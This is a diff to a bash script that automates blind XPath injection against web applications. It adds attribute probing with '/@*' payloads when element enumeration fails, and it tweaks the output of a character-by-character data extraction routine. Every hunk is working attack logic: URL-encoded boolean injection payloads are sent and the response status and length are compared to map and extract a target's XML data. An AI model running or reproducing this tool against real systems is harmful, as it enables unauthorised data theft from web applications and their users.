@@ -1188,7 +1188,9 @@ while [[ $ecount -le $fcount ]] ; do
 	#' or count($obuff)=1 or 'a'='b
 	#%27%20%6f%72%20%63%6f%75%6e%74%28$obuff%29%3d%31%20%6f%72%20%27%61%27%3d%27%62
 	xcount=1
+	success=0
 	while [[ $xcount -le $maxxcount ]] ; do
+		
 		vbuff="%2f%2a%5b$xcount%5d"
 		xbuff="$obuff""$vbuff"
 
@@ -1203,7 +1205,8 @@ while [[ $ecount -le $fcount ]] ; do
 		((lendiff=$length_true-$length_false))
 		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 			echo "$ybuff" >> ./listofxpathelements.txt
-			echo "$ybuff" 
+			echo "$ybuff"
+			success=1 
 			#xpathdataextraction
 		fi
 		if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
@@ -1211,7 +1214,34 @@ while [[ $ecount -le $fcount ]] ; do
 				echo "$ybuff" >> ./listofxpathelements.txt				
 				echo "$ybuff"
 				#xpathdataextraction
+				success=1
 			fi
+		fi
+		#if the above fails, test for attribute with /@*
+		if [[ "$success" == "0" ]] ; then
+			vbuff="%2f%40%2a%5b$xcount%5d"
+			xbuff="$obuff""$vbuff"		
+
+			rbuff="/@*[$xcount]"
+			ybuff="$mbuff""$rbuff"
+
+			badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1%20%6f%72%20%27%61%27%3d%27%62"`
+			requester
+			status_true=`echo $response | cut -d ":" -f 1`
+			length_true=`echo $response | cut -d ":" -f 2`
+	
+			((lendiff=$length_true-$length_false))
+			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+				echo "$ybuff" >> ./listofxpathelements.txt
+				echo "$ybuff"
+			fi
+			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+				if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+					echo "$ybuff" >> ./listofxpathelements.txt				
+					echo "$ybuff"
+				fi
+			fi
+
 		fi
 		((xcount=$xcount+1))
 	done
@@ -1262,7 +1292,7 @@ done
 
 xpathdataextraction()
 {
-echo "Commencing data extraction. You may see empty lines; please be patient."
+echo "Commencing data extraction."
 
 #always false:                                       #' or substring(name(parent::*[position()=1]),1,1)='a' and 'a'='b
 badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27%20%61%6e%64%20%27%61%27%3d%27%62"`
@@ -1289,6 +1319,7 @@ cat ./listofxpathelements.txt 2>/dev/null | while read ybuff ; do
 		outbuf=$outbuf`printf "%02x" "'$char'"`
 		((i++))
 	done 
+	echo -n "$ybuff "
 	#echo "$outbuf"
 	#echo "ybuff $ybuff"
 	jflag=1
@@ -1306,7 +1337,7 @@ cat ./listofxpathelements.txt 2>/dev/null | while read ybuff ; do
 			((lendiff=$length_true-$length_false))
 			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 				if [[ $weflag == "0" ]] ; then 
-					echo -n "$ybuff "
+					#echo -n "$ybuff "
 					weflag=1
 				fi
 				echo -n "$ipo"
@@ -1315,7 +1346,7 @@ cat ./listofxpathelements.txt 2>/dev/null | while read ybuff ; do
 			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 				if [[ $lendiff -gt 3 || $lendiff -lt -3 ]] ; then
 					if [[ $weflag == "0" ]] ; then 
-						echo -n "$ybuff "
+						#echo -n "$ybuff "
 						weflag=1
 					fi
 					echo -n "$ipo"
